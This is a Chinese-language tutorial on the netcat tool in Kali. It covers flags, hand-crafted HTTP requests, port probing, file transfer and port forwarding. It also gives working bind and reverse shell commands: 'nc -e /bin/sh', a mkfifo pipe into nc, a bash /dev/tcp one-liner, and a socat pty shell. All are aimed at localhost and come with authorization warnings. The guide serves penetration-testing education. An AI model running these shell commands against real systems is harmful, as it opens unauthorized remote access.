# netcat（TCP/IP 瑞士军刀）

> **一句话**：把 TCP/UDP 连接抽象成「一对可以读写的文件」——连上、发数据、收数据、转发、监听，全部在一条命令里完成；端口探测、文件传输、手搓 HTTP 请求、正反向 shell 都靠它。
> **分类**：漏洞利用 / 网络管道与手工交互 ｜ **Kali 包**：`netcat-traditional`（命令 `nc.traditional`，通常通过 alternatives 暴露为 `nc`）｜ **官方文档**：<https://www.kali.org/tools/netcat/> ｜ 上游（经典版）：<http://www.stearns.org/nc/>

---

## 1. 它解决什么问题

有一大类任务，本质上就是「**在某端口上读写一段字节**」：

- 想知道某端口开不开 → **连接一下就知道了**；
- 想手搓一个 HTTP 请求看响应 → **连上发字符串**；
- 想在两台机器间传一个文件 → **一边收一边发**；
- 想抓一个反弹回来的 shell → **监听端口，等对端连上**；
- 想做一个 TCP 端口转发 → **把两个连接对接起来**；
- 想手工和 SMTP/Redis/Memcached 这类文本协议对话 → **连上打字**。

`nc` 把这些都变成一条命令。**它的核心抽象只有一个**：

```
        nc = 把「网络连接」变成「标准输入/标准输出」

   stdin  ──►┌─────────┐──►  TCP/UDP socket  ──► 目标
   stdout ◄──└─────────┘◄──
              nc
```

**对比同类（选型在这一节就定下来）**：

| 工具 | 特点 | 差异 |
|------|------|------|
| **netcat-traditional**（`nc.traditional`） | 1996 年 Hobbit 的**经典版** | **最贴近原始语义**；有 `-e`、`-c`（**危险**）；`-k` 是 **keepalive**（不是「持续监听」！） |
| **netcat-openbsd**（`nc`） | Debian/Kali 另一个 `nc` 提供者 | **少了 `-e`/`-c`**（安全考虑）；`-k` 是「**持续监听**」（语义与经典版冲突！）；有 `-N`、`-X`（代理）等 |
| **ncat**（`nmap` 包，`ncat`） | Nmap 项目重写 | **功能最全**：`--ssl`、`--exec`、`--proxy`、`--allow`、`-k` 持续监听；**现代推荐** |
| **socat** | 「双向数据搬运器」 | **强得多**：任意地址类型组合（`TCP-LISTEN:...` ↔ `EXEC:...`、UNIX socket、PTY、串口…）、有 `-v` 抓包、能 TLS。见 [`../12-基础设施与C2/socat.md`](../12-基础设施与C2/socat.md) |
| **`/dev/tcp`**（bash 内建） | 不需要任何工具 | **最快的手工连通性测试**：`echo > /dev/tcp/host/port`（bash-only） |
| **`openssl s_client`** | TLS 客户端 | 需要 TLS 时用它（nc 通常不做 TLS，ncat/socat 可以） |

**一句话选型**：

- **学习/教学/最快上手** → `nc`（经典版或 openbsd 都行，**但要注意两者 `-k` 语义不同**）；
- **要 SSL / 要可靠的持续监听 / 要访问控制** → **`ncat`**；
- **要复杂连接（PTY、串口、双向转发、TLS、脚本化）** → **`socat`**；
- **只要「一次性连通性测试」** → bash 的 `/dev/tcp` 就够了。

**⚠️ 一个必须记住的坑**：**Kali 里 `nc` 可能是传统版也可能是 openbsd 版**（两者都通过 `update-alternatives` 提供 `/bin/nc`）。**它们的 `-k` 含义相反**：

| | `netcat-traditional` | `netcat-openbsd` |
|---|---|---|
| `-k` | **socket keepalive** | **监听模式下持续接受多个连接** |
| `-e` / `-c` | ✅ 有（危险） | ❌ 通常没有 |
| 验证命令 | `nc.traditional -h` | `nc -h`（openbsd 风格） | 

**先确认你用的是哪个**：

```bash
readlink -f "$(command -v nc)"
update-alternatives --display nc 2>/dev/null | head
```

---

## 2. 工作原理

### 2.1 模型：一切都归约为「两个流对接」

```
                         ┌──────────────────────────────┐
                         │             nc               │
   ┌────────┐  stdin  ──►│  ┌────────────────────────┐  │
   │ 你的   │            │  │   一个 socket 对象       │  │──► send() ──► 网络
   │ shell  │◄── stdout ─│  │  （TCP 或 UDP，连接或    │  │◄── recv() ── 网络
   └────────┘            │  │    监听）                │  │
                         │  └────────────────────────┘  │
                         └──────────────────────────────┘
```

`nc` 不解析任何协议——**它只是把 stdin 的字节送进 socket，把 socket 的字节写到 stdout**。所有「功能」（HTTP 请求、文件传输、shell）都是**这个机制在不同场景下的用法**，不是 nc 内置的特性。

**理解这一点，就能理解所有 nc 的用法**：

| 用法 | 本质 |
|------|------|
| 端口扫描 | 反复「连接成功/失败」，不传数据（`-z`） |
| 手搓 HTTP | 往 socket 写 `GET / HTTP/1.0\r\n\r\n`，读回响应 |
| 文件传输 | 发送端把文件喂进 stdin；接收端把 stdout 重定向进文件 |
| **正向 shell** | 监听端把 socket 接到 `/bin/sh` 的 stdin/stdout（`-e /bin/sh`） |
| **反向 shell** | 目标端把 `/bin/sh` 接到「连出去的 socket」上 |
| 端口转发 | 用**两个 nc 进程** + 管道：`nc -l A | nc host B` |
| 蜜罐/蜜标 | 用一个 nc 监听骗一次连接（会打印对方发来的内容） |

### 2.2 「正向 shell / 反向 shell」的原理（本篇最重要的两条链）

**核心都只有一件事：把某个程序的 stdin/stdout 接到 socket 上。**

**① 正向 shell（bind shell）—— 目标监听，攻击方连接**

```
                                       目标机器（被控）
   ┌──────────┐                    ┌─────────────────────────────┐
   │  你的机器 │                    │  nc -l -p 4444 -e /bin/sh   │
   │          │  连接 4444  ─────►│    socket ◄──► /bin/sh      │
   │ nc ip 4444                    │      （-e 把 sh 接到 socket）│
   └──────────┘                    └─────────────────────────────┘
   你打的每个字符 → sh 的 stdin
   sh 的输出     → 你的终端
```

**问题**：目标必须「**能被连上**」——有公网 IP、或被攻击方可达、且**防火墙放通入站**。现实中这很少成立（NAT + 入站防火墙）。

**② 反向 shell（reverse shell）—— 攻击方监听，目标主动连出**

```
   ┌──────────────────┐                    目标机器（被控）
   │   你的机器        │              ┌────────────────────────────┐
   │  nc -l -p 4444   │◄──── 连接 ───│  nc <你的IP> 4444 -e /bin/sh │
   │  （等你连进来）   │              │    socket ◄──► /bin/sh      │
   └──────────────────┘              └────────────────────────────┘
```

**为什么实际都用反向 shell**：

| 方向 | 入站防火墙 | NAT | 出站防火墙 | 现实可行性 |
|------|------------|-----|------------|------------|
| 正向（目标监听） | **需要放通入站** | **需要端口映射** | —— | 差 |
| **反向（目标连出）** | 不需要 | **不需要** | 通常宽松（允许出站） | **好** |

**这就是为什么「反弹 shell」是渗透测试里最常见的 payload 形态**——**它顺着网络策略最容易放行的方向走**。

### 2.3 端口转发 / 隧道：两个 nc + 一个管道

```
        ┌──────────────────────────────────────────────────┐
        │  nc -l -p 8080 | nc 10.0.0.5 80                  │
        │      │                    │                      │
        │  监听 8080           连到内网 80                  │
        │      └──── 管道 ────────┘                        │
        │   （你连 8080 的流量被原样转发到 10.0.0.5:80）      │
        └──────────────────────────────────────────────────┘
```

**但这只做了「单向数据流的一半」**——`|` 只能把 A 的 stdout 接到 B 的 stdin，**回程数据没有接回来**。所以**这个经典用法只能应对「请求-响应量很小」或「只需单向」的场景**，正式转发应该用：

- **`socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80`**（正确且支持多连接，见 [`socat.md`](../12-基础设施与C2/socat.md)）；
- 或 **`chisel`** / **`ligolo-ng`** / **`ssh -L`**（见 [`chisel.md`](../08-后渗透/chisel.md)、[`ligolo-ng.md`](../08-后渗透/ligolo-ng.md)）。

**这是 nc 的一个「被过度神话」的用法**——知道它，但别在真实项目里用它做端口转发。

### 2.4 `-e` 为什么危险

`-e` 让 nc **执行任意程序并把它接到 socket 上**。这意味着：

- **任何能连上这个端口的人，都能获得一个 shell** —— 等于**主动开了一个后门**；
- 因此 **`netcat-openbsd` 与许多现代发行版刻意去掉了 `-e`/`-c`**；
- 现代的替代方案是 **ncat 的 `--exec`** 和 **socat 的 `EXEC:`**——功能一样，但至少不是「默认自带后门开关」。

**在任何系统上给 nc 监听端口加 `-e`，都必须极其谨慎**——你打开的可能是全网可达的 root shell。

---

## 3. 安装与快速上手

```bash
sudo apt install netcat-traditional
command -v nc nc.traditional
```

```console
root@kali:~# command -v nc nc.traditional
/usr/bin/nc
/usr/bin/nc.traditional
```

```bash
nc.traditional -h
```

```console
root@kali:~# nc.traditional -h
[v1.10-50.1]
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-r			randomize local and remote ports
	-q secs			quit after EOF on stdin and delay of secs
	-s addr			local source address
	-T tos			set Type Of Service
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-C			Send CRLF as line-ending
	-z			zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```

**确认你到底在用哪一版 `nc`**（**必做**，因为 `-k` 的语义不同）：

```bash
readlink -f "$(command -v nc)"
# 若输出 …/nc.traditional → 经典版
# 若输出 …/nc.openbsd     → openbsd 版
update-alternatives --display nc 2>/dev/null
```

**如果想让 `nc` 默认用经典版**：

```bash
sudo update-alternatives --config nc      # 交互式选择
# 或直接指定
sudo update-alternatives --set nc /bin/nc.traditional
```

**最小可用（今天的第一次使用）**：

```bash
# 终端 A：监听
nc -l -p 4444
# 终端 B：连上并打字
nc 127.0.0.1 4444
# 两边打的字会互相出现在对方终端里 —— 这就是 nc 的全部本质
```

**另一个万能起手式**：**手搓 HTTP 请求**（不装任何工具，纯 nc）：

```bash
printf 'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n' | nc -v example.com 80
```

```console
example.com [93.184.216.34] 80 (http) open
HTTP/1.0 200 OK
Content-Type: text/html; charset=UTF-8
...
```

---

## 4. 核心参数详解

> 以下全部取自 `nc.traditional -h`（v1.10）。

### 4.1 连接与监听（最核心）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `hostname port[s] [ports] ...` | **连接模式**：连到主机的一个或多个端口 | 多个端口会**依次尝试** |
| `-l` | **监听模式**（入站连接） | Python 3.11 及以前的经典用法 |
| `-p port` | **本地端口** | 经典版里**监听必须用 `-l -p <port>`**（openbsd 版写 `nc -l <port>`） |
| `-u` | **UDP 模式** | 默认是 TCP；做 DNS/SNMP/NTP 相关测试要加 |

> **`-l -p <port>` 还是 `-l <port>`**：**经典版要求 `-l -p 4444`**；openbsd 版两种都行（`-p` 是「本地源端口」）。**写 `-l -p` 兼容性最好**。

### 4.2 数据与超时控制（**这些参数决定「为什么我的 nc 卡住了」**）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-q secs` | **stdin 遇到 EOF 后再等 `secs` 秒才退出** | **解决「发完请求立刻断开、收不到响应」的必备参数**（见场景 1） |
| `-w secs` | **连接超时 / 最终读取超时** | 端口扫描时用它控制「不响应」的等待时间 |
| `-i secs` | 发送行之间的延迟（也用于端口扫描间隔） | 慢速探测躲 IDS；或避免压垮目标 |
| `-z` | **zero-I/O 模式**（只连接不传数据） | **端口扫描专用** |
| `-o file` | **把流量做成 hex dump 写文件** | 取证/留证：`nc -o traffic.hex …` |
| `-C` | 发送 CRLF 作为行结束 | 与 Windows/HTTP 一类要求 CRLF 的协议对话时用 |
| `-t` | 回应 TELNET 协商 | 连 telnet 服务时避免卡在协商上 |

### 4.3 危险参数（**理解但慎用**）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-e <program>` | **连接建立后执行 program，并把它的 stdin/stdout 接到 socket** | **危险**：等于开 shell。**只在授权测试的实验室里用** |
| `-c <shell commands>` | 同 `-e`，用 `/bin/sh` 执行 | **危险**：同上 |

> **`-e` 是「后门开关」**。任何能连上该端口的人都能执行程序（通常以 nc 进程的权限）。**生产/公网环境绝不能带 `-e` 监听**。
>
> **openbsd 版与许多发行版刻意移除了 `-e`/`-c`**——需要这个能力时请用 **`ncat --exec`** 或 **`socat … EXEC:…`**。

### 4.4 网络与路由

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-n` | **不做 DNS 解析**（只接受数字 IP） | 加速、避免 DNS 泄露；扫描时建议加 |
| `-s <addr>` | **指定本地源地址** | **多网卡/多 IP 环境指定从哪个 IP 出去**；也可用于「源 IP 溯源/测试 ACL」 |
| `-r` | **随机化本地与远程端口** | 规避基于源端口的会话跟踪；也可做「弱随机性测试」 |
| `-b` | 允许广播 | UDP 广播测试（谨慎，会打扰整网） |
| `-g <gateway>` / `-G <num>` | **源路由**（最多 8 跳 / 指针 4,8,12…） | 老式源路由；现实中基本被禁用（安全原因）。**了解即可** |
| `-T <tos>` | 设置 IP TOS 字段 | QoS 相关测试；也是「用非默认 TOS 看 IDS 是否检测」的边角用法 |
| `-k` | ⚠️ **经典版：设置 socket keepalive** | **注意与 openbsd 版的 `-k`（持续监听）含义相反** |
| `-v` | 详细输出（`-v -v` 更详细） | 看连接过程、确认是否 open |
| `-h` | 帮助 | —— |

### 4.5 端口写法

```
单个端口：      80
端口列表：      22 80 443
区间：          20-25
范围+单点：     20-25 80
服务名：        http        （会查 /etc/services）
带连字符的服务名：ftp\-data   （必须反斜杠转义连字符）
```

### 4.6 现代替代方案速查（**把常用 nc 用法映射到 ncat/socat**）

| 想做的事 | nc（经典） | ncat | socat |
|----------|-----------|------|-------|
| 监听一次 | `nc -l -p 4444` | `ncat -l 4444` | `socat TCP-LISTEN:4444 -` |
| **持续监听（多连接）** | ❌（经典版不行） | `ncat -l -k 4444` | `socat TCP-LISTEN:4444,fork -` |
| 连接 | `nc host port` | `ncat host port` | `socat - TCP:host:port` |
| **执行程序并接到 socket** | `-e /bin/sh`（危险） | `ncat -l --exec "/bin/sh"` | `socat TCP-LISTEN:4444,fork EXEC:/bin/sh` |
| TLS | ❌ | `ncat --ssl …` | `socat OPENSSL:host:port` |
| **双向端口转发** | ⚠️ 不完整（管道只有一个方向） | `ncat`/`socat` 都更合适 | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| 限制来源 | ❌ | `ncat -l --allow <ip>` | 靠防火墙 |

---

## 5. 实战演练

> **环境声明**：以下全部在**你自己的机器 / 自建靶场（如 DVWA 容器、Metasploitable）/ 获得授权的目标**上进行。
> - **端口扫描**：只扫**你拥有或授权**的主机。扫描第三方网络可能违反《网络安全法》第 27 条；
> - **正/反向 shell**：`-e /bin/sh` 是**开后门**。**只能在你的实验环境里做**——对任何非授权系统使用即构成犯罪；
> - **文件传输**：只在自有机器间传；不要用来外带他人数据；
> - 本文所有 shell 示例都用**本地回环 + 自己的进程**演示。

### 场景 1：手工与网络对话（HTTP / 文本协议 / 抓请求）

**1a. 手搓 HTTP（理解「HTTP 就是文本」）**

```bash
# Linux 上启动一个本地 HTTP 服务作为目标
python3 -m http.server 8000 --directory /tmp &
printf 'GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n' | nc -v 127.0.0.1 8000
```

```console
127.0.0.1 [127.0.0.1] 8000 (?) open
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.0
Date: Tue, 15 Sep 2026 10:30:00 GMT
Content-type: text/html; charset=utf-8
Content-Length: 1234
...
```

**解读（逐行拆开 HTTP 请求）**：

```
GET / HTTP/1.0\r\n        ← 请求行：方法 + 路径 + 版本，以 CRLF 结尾
Host: 127.0.0.1\r\n       ← 头字段，每行一个 CRLF
\r\n                      ← 空行 = 请求头结束（这一个空行至关重要！）
```

**⚠️ 最常见的坑**：**少写那个空行 `\r\n` → 服务器会一直等你的请求头，nc 就卡住不动**。

**1b. 那个经典问题：「为什么我的 nc 卡住收不到响应？」**

```bash
# ❌ 常见错误：管道里的数据发完了，nc 收到 EOF 就关闭了连接，响应还没到
printf 'GET / HTTP/1.0\r\n\r\n' | nc 127.0.0.1 8000     # 有时能看到响应，有时看不到

# ✅ 正确做法：用 -q 让 nc 在收到 EOF 后再等几秒
printf 'GET / HTTP/1.0\r\n\r\n' | nc -q 2 127.0.0.1 8000
```

**解读**：

| 参数 | 作用 |
|------|------|
| `-q 2` | **stdin 到 EOF 后不立刻断开，再等 2 秒读取** ← 让响应有机会回来 |
| `-w 3` | 连接/最终读取超时（防「卡死」） |

**这两个参数是「nc 用得好不好」的分水岭**。

**1c. 交互式连接（连上后手工打字）**

```bash
# 连一个 SMTP 服务（用你自己的测试服务），手工逐个命令
nc -v 127.0.0.1 25
```

```console
220 mail.example.com ESMTP
HELO test.local              ← 你输入
250 mail.example.com
QUIT                         ← 你输入
221 Bye
```

**解读**：这就是「用 nc 做协议调试」——**对 SMTP/POP3/IMAP/Redis/Memcached 这类文本协议尤其好用**。交互式会话里 **Ctrl-D 结束 stdin，Ctrl-C 强退**。

**1d. 抓一个请求的原文（`-o` 留证）**

```bash
printf 'GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n' | nc -q 2 -o /tmp/nc-traffic.hex 127.0.0.1 8000 > /dev/null
cat /tmp/nc-traffic.hex
```

```console
# 十六进制转储，含方向标记 —— 可用于留证与逐字节核对
```

### 场景 2：端口探测 + 文件传输

**2a. 端口探测（`-z` + `-v`；也可配合 `-w` 控制超时）**

```bash
# 扫描自己本机的常用端口
nc -zv -w 1 127.0.0.1 22 80 443 3306 8000 2>&1
```

```console
nc: connect to 127.0.0.1 port 22 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 80 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 443 (tcp) failed: Connection refused
nc: connect to 127.0.0.1 port 3306 (tcp) failed: Connection refused
Connection to 127.0.0.1 8000 port [tcp/*] succeeded!
```

**解读**：

| 输出 | 含义 |
|------|------|
| `succeeded!` | 端口**开放** |
| `Connection refused` | **有主机但端口关闭**（收到了 RST） |
| `timed out` / 无输出 | **被过滤**（防火墙丢包）——用 `-w` 控制等待时间 |

```bash
# 扫一个端口区间（区间语法）
nc -zv -w 1 127.0.0.1 8000-8010 2>&1 | grep succeeded
```

**注意**：`-z` 是**只连接不传数据**，所以**不会在应用日志里留下「有请求」**——但也因此**测不出「需要发数据才响应」的服务**。

**2b. 与 nmap 的关系（为什么还要手工验证）**

```bash
# nmap 给出结论
nmap -Pn -p 8000,22 127.0.0.1
# nc 给出「我亲手连上了」的直接证据
nc -zv -w 1 127.0.0.1 8000
```

**解读**：nmap 会综合多种探测技术（可能给出 `filtered`/`open|filtered` 等不确定结论）。**nc 是一个「最朴素的真值来源」**：

- `nmap` 报 `open|filtered` → 用 `nc -zv` 确认真实情况；
- nmap 报 `filtered` → 用 `nc` 看是 `refused`（其实开着）还是 `timeout`（确实被过滤）。

见 [`../01-信息搜集/nmap.md`](../01-信息搜集/nmap.md)。

**2c. 文件传输（两个方向都练一遍）**

**接收端（先起）**：

```bash
# 终端 A：接收，把 socket 的字节写进文件
nc -l -p 4445 > /tmp/received.bin
```

**发送端**：

```bash
# 终端 B：把文件喂进 socket
dd if=/dev/urandom of=/tmp/send.bin bs=1M count=5
nc -q 2 127.0.0.1 4445 < /tmp/send.bin
```

**校验**：

```bash
md5sum /tmp/send.bin /tmp/received.bin
```

```console
b1f2c3...  /tmp/send.bin
b1f2c3...  /tmp/received.bin      ← 一致 = 传输成功
```

**解读**：

| 要点 | 说明 |
|------|------|
| **顺序** | **必须先起接收端**（监听），否则发送端连不上 |
| **`-q 2`** | 发送端用完 stdin 后等 2 秒再关，确保数据发完 |
| **校验哈希** | 裸 TCP 传输**没有校验**；必须自己 `md5sum`/`sha256sum` |
| **无压缩无续传** | 中断就得重来；大文件用 `scp`/`rsync` |

**⚠️ 明文传输**：nc 传的是**裸 TCP，无加密**。**生产环境传文件请用 `scp`/`rsync over ssh`**；nc 只适合实验环境内的快速搬运。

**2d. 反向传（目标没有监听能力时）**

```bash
# 终端 A（接收方）监听
nc -l -p 4446 > /tmp/pulled.bin
# 终端 B（有文件的一方）主动推
nc -q 2 127.0.0.1 4446 < /tmp/send.bin
```

> **`nc` 自己不能「拉」文件**（没有「收到命令后发文件」的逻辑）。**要「拉」需要另一端配合**（例如另一端执行 `nc 你 4446 < 文件`）。**真正的「拉」用 socat/ncat 或干脆 scp。**

### 场景 3：正向 shell / 反向 shell / 端口转发（**仅在自有实验环境**）

> ⚠️ **以下示例会实际创建可远程执行的 shell**。**只在你自己拥有的一次性实验环境（本地虚拟机、Docker 容器）里做**。对这些链路之外的任何系统使用，都属于**未授权访问**，涉嫌《刑法》第 285 条。
>
> **最安全的练习方式**：用**两台本地虚拟机**，或**一个 Docker 容器 + 宿主机**，且**监听绑定 127.0.0.1**。

**3a. 正向 shell（bind shell）**

```bash
# 「目标」终端 A：监听并执行 shell（经典版 nc 才有 -e）
nc -l -p 4444 -e /bin/sh
```

```bash
# 「攻击方」终端 B：连上去
nc -v 127.0.0.1 4444
```

```console
# 现在你在 B 里打的命令，在 A 上以 nc 进程的权限执行：
id
uid=1000(user) gid=1000(user) groups=1000(user)
pwd
/home/user
```

**解读**：

| 要点 | 说明 |
|------|------|
| `-e /bin/sh` | **把 sh 的 stdin/stdout 接到 socket** —— 这就是 shell 的全部机制 |
| 正向的**致命缺陷** | 需要**入站可达**（NAT/防火墙通常不允许） |
| 无加密、无认证 | 任何能连上的人都拿到 shell；流量明文 |
| **无 TTY** | 没有伪终端 → `sudo`、`su`、`top`、`vim` 等交互程序**会报错或行为异常** |

**3b. 反向 shell（reverse shell）—— 现实中最常用**

```bash
# 「攻击方/接收方」终端 A：先监听
nc -l -p 4445 -v
```

```bash
# 「目标」终端 B：主动连出去（经典版用 -e；openbsd 版没有 -e 时用命名管道）
nc -q 0 127.0.0.1 4445 -e /bin/bash
```

```console
# 终端 A 会看到：
connect to [127.0.0.1] from localhost [127.0.0.1] 52734
# 然后就可以在 A 里执行命令
id
uid=1000(user) ...
```

**没有 `-e` 时（openbsd 版 / 想避免用 `-e`）—— 命名管道法**：

```bash
# 「目标」端：用 FIFO 把 shell 的输入输出接到 socket
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -q 0 127.0.0.1 4445 > /tmp/f
# 或更紧凑（bash）：
bash -i >& /dev/tcp/127.0.0.1/4445 0>&1     # 不需要 nc 也能反弹！
```

**解读**：

| 方法 | 依赖 | 特点 |
|------|------|------|
| `nc -e /bin/sh` | 经典版 nc | 最直接 |
| **FIFO + 管道** | mkfifo | **不依赖 `-e`**，兼容 openbsd 版 |
| **bash `/dev/tcp`** | bash | **完全不需要 nc**（推荐记这条） |
| `ncat --exec` | ncat | 更清晰，且 ncat 支持 `--ssl` |
| `socat … EXEC:` | socat | 可加 `pty` 得到**真正的 TTY**（见 [`socat.md`](../12-基础设施与C2/socat.md)） |

**为什么反向 shell 更常用**（回顾第 2 节）：**出站流量通常被允许，入站通常被拦**。反向 shell 顺着「允许出站」这个方向走。

**3c. 从「裸 shell」到「可用 shell」**（这是实战里必然遇到的一步）

裸 nc shell **没有 TTY**，所以很多命令会失败。**升级为交互式 TTY**（授权环境内）：

```bash
# 方法 1：Python 起 pty（目标上要有 python）
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 然后 Ctrl-Z 挂起，回到你自己的终端：
stty raw -echo; fg
# 回车两次，再设置终端类型：
export TERM=xterm; stty rows 50 cols 200
```

```bash
# 方法 2：直接用 socat 拿到 TTY（更干净）
# 目标端：
socat TCP:127.0.0.1:4446 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
# 接收端：
socat file:`tty`,raw,echo=0 TCP-LISTEN:4446
```

**解读**：`socat` 的 `pty` 选项**一步拿到伪终端**——这是 socat 相对 nc 的关键优势。

**3d. 端口转发（并说明为什么它「不完整」）**

```bash
# 经典「单向管道转发」：把本地 8080 转到 10.0.0.5:80
nc -l -p 8080 | nc 10.0.0.5 80
```

**问题**：`|` 只把「左边进程的 stdout」接到「右边进程的 stdin」——**只有 A→B 一个方向**，B→A 的回程没有接上。

**正确做法（用 socat）**：

```bash
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80
```

**对比**：

| 方案 | 双向 | 多连接 | 稳定性 |
|------|------|--------|--------|
| `nc -l 8080 \| nc target 80` | ❌ 只有单向 | ❌ | 差 |
| **`socat TCP-LISTEN:8080,fork TCP:target:80`** | ✅ | ✅ | 好 |
| `ssh -L 8080:target:80` | ✅ | ✅ | 最好（有加密认证） |
| `chisel` / `ligolo-ng` | ✅ | ✅ | 适合复杂内网 |

**结论**：**nc 的「端口转发」是教学示例，不是生产方案**。真正做转发用 socat / ssh / chisel / ligolo-ng（见 [`socat.md`](../12-基础设施与C2/socat.md)、[`chisel.md`](../08-后渗透/chisel.md)、[`ligolo-ng.md`](../08-后渗透/ligolo-ng.md)）。

**3e. 清理**

```bash
# 杀掉所有本地练习用的 nc
pkill -f 'nc -l -p 444' 2>/dev/null; kill %1 2>/dev/null
rm -f /tmp/f /tmp/send.bin /tmp/received.bin /tmp/pulled.bin
```

---

## 6. 输出解读

### 6.1 连接/扫描模式的输出

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Connection to <host> <port> ... succeeded!` | **端口开放**（TCP 三次握手成功） | 用 `-v` 看 banner；或再用 nmap `-sV` 识别服务 |
| `connect to <host> port <p> (tcp) failed: Connection refused` | **主机可达，端口关闭**（收到 RST） | 该端口没服务；换端口 |
| `connect to ... failed: Connection timed out` | **被过滤或主机不可达**（丢包） | 用 `-w` 控制等待；判断是防火墙还是主机下线 |
| `connect to ... failed: Network is unreachable` | 路由不通 | 检查网络/路由 |
| `nc: getaddrinfo for host "x" failed` | DNS 解析失败 | 用 `-n` + IP 排除 DNS 因素 |
| 连上后**没有输出** | 服务不会主动发 banner（很多 HTTP 服务就是） | **这正是要发数据的原因**：发一个请求看响应 |
| 卡住不动（不返回也不退出） | ① 少写了请求的空行；② 服务在等你继续输入；③ 需要 `-q`/`-w` | 检查请求格式；加 `-q 2 -w 3` |

### 6.2 监听模式的输出

| 输出 | 含义 |
|------|------|
| `listening on [any] 4444 ...` | 监听已开始 |
| （连接时）`connect to [<your ip>] from <peer> [<ip>] <port>` | **有人连上来了** —— 记下来源 |
| 对方发来的内容直接出现在终端 | 这就是「数据被写到 stdout」 |
| 监听后立刻退出（经典版） | 经典版 `-l` **只接受一个连接** → 想要持续监听要用 openbsd 的 `-k` 或 `ncat -k` |

### 6.3 判断「我拿到的 shell 是什么权限」

```bash
id                  # 当前用户与组
whoami              # 用户名
cat /etc/os-release # 操作系统
sudo -l             # 能免密执行什么（如果有 sudo）
env                 # 环境变量（可能含敏感信息）
```

| 观察 | 含义 |
|------|------|
| `uid=0(root)` | **已经是 root** |
| `uid=33(www-data)` | Web 服务权限（典型的「拿到 WebShell 后」的起点） |
| `command not found` 大量出现 | **PATH 被限制**（常见于容器/受限 shell）→ 用绝对路径 `/usr/bin/id` |
| `sudo: no tty present` | **没有 TTY** → 需要先升级为 pty（见场景 3c） |
| `su`/`passwd` 报错 | 同上，需要 TTY |

---

## 7. 与其他工具配合

```
   ① 主机/端口发现
      nmap / masscan                    → ../01-信息搜集/nmap.md、masscan.md
                      │
   ② 用 nc 做「手工真值验证」
      nc -zv host port                  ← 本文（最朴素的开放判定）
      nc host port  （看 banner）        ← 本文
                      │
   ③ 服务识别与利用
      nmap -sV / whatweb                → ../01-信息搜集/whatweb.md
      searchsploit / metasploit         → ../02-漏洞分析/searchsploit.md、../06-漏洞利用/
                      │
   ④ 拿 shell（授权环境）
      nc -e / 反向 shell / bash /dev/tcp  ← 本文
      msfvenom 生成 payload             → ../06-漏洞利用/msfvenom.md
      metasploit handler 接收            → ../06-漏洞利用/metasploit-framework.md
                      │
   ⑤ shell 升级与稳定化
      socat（拿到 TTY）                  → ../12-基础设施与C2/socat.md
      python3 -c 'import pty;pty.spawn'
                      │
   ⑥ 隧道与横向
      chisel / ligolo-ng / proxychains   → ../08-后渗透/chisel.md、ligolo-ng.md、proxychains4.md
                      │
   ⑦ 文件搬运
      小文件用 nc（实验）→ 生产用 scp/rsync
                      │
   ⑧ 流量留证
      tcpdump / wireshark                → ../07-嗅探与欺骗/tcpdump.md、wireshark.md
      或 nc -o 的 hex dump               ← 本文
```

**nc 的「不可替代性」在哪里**（也就是它今天仍然值得学的理由）：

| 场景 | 为什么用 nc |
|------|-------------|
| **服务 banner / 协议手工调试** | 没有任何工具比「手打字」更直接 |
| **最小依赖的连通性测试** | 几乎所有 Linux 都有（或 bash 的 `/dev/tcp`） |
| **反弹 shell 的接收端** | 一条命令就能监听（比 msf handler 轻） |
| **理解 TCP 语义** | 它是「网络的 cat」，是最好的教具 |
| **快速文件搬运（实验环境）** | 一条命令，不需要配置 |

**什么时候该换工具**：

| 需求 | 换用 |
|------|------|
| 需要 TLS | `ncat --ssl` / `openssl s_client` / `socat OPENSSL:` |
| 需要持续监听多连接 | `ncat -l -k` / `socat ... fork` |
| 需要真正的端口转发 | `socat` / `ssh -L` / `chisel` / `ligolo-ng` |
| 需要访问控制 | `ncat --allow` / 防火墙 |
| 需要 PTY | `socat ... pty` |
| 需要可靠传输大文件 | `scp` / `rsync` |

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| **连上后卡住，收不到响应** | ① HTTP 请求**少写了空行 `\r\n`**；② 管道里 stdin 到 EOF 后 nc 立刻关了连接 | **补上 `\r\n`**；**加 `-q 2`**（stdin EOF 后再等 N 秒） |
| `nc: connect to host port (tcp) failed: Connection refused` | 端口关闭（收到 RST） | 换端口；确认服务是否在跑 |
| `Cannot assign requested address` | 用了 `-p` 指定已被占用的本地端口 | 换端口；或去掉 `-p` |
| `Address already in use` | 监听端口被占 | 换端口；`ss -lntp \| grep <port>` 找占用者 |
| `nc: Permission denied` | 绑 <1024 端口需要权限 | `sudo`；或换高端口 |
